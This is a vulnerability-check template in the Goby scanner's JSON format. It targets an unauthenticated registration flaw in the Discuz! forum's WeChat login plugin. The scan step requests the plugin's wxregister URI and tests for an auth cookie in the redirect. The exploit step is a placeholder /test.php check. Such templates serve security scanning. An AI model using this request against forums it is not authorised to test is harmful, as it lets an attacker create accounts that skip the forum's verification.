{
      "Name": "Discuz Wechat Plugins Unauth",
      "Level": "2",
      "Tags": [
            "unauth"
      ],
      "GobyQuery": "app=\"Discuz\" || body=\"Powered by Discuz!\"",
      "Description": "Discuz! is Internet forum software written in PHP and developed by Comsenz Technology Co., Ltd. It supports MySQL and PostgreSQL databases.",
      "Product": "Discuz!",
      "Homepage": "https://www.discuz.net/",
      "Author": "",
      "Impact": "Generated by the official WeChat login plug-in of Discuz Forum, attackers can use the vulnerability of this plug-in to bypass the forum's mailbox, mobile phone number and other verifications to illegally create a forum account. The forum account created through this vulnerability has all the permissions of ordinary users and can be arbitrarily Post a reply.",
      "Recommendation": "",
      "References": [
            "https://gitee.com/ComsenzDiscuz/DiscuzX/issues/IPRUI"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/plugin.php?id=wechat:wechat&ac=wxregister",
                        "follow_redirect": false,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "302",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$head",
                                    "operation": "contains",
                                    "value": "wsq.discuz.com",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$head",
                                    "operation": "contains",
                                    "value": "set-cookie",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$head",
                                    "operation": "contains",
                                    "value": "auth",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "location",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/test.php",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "test",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}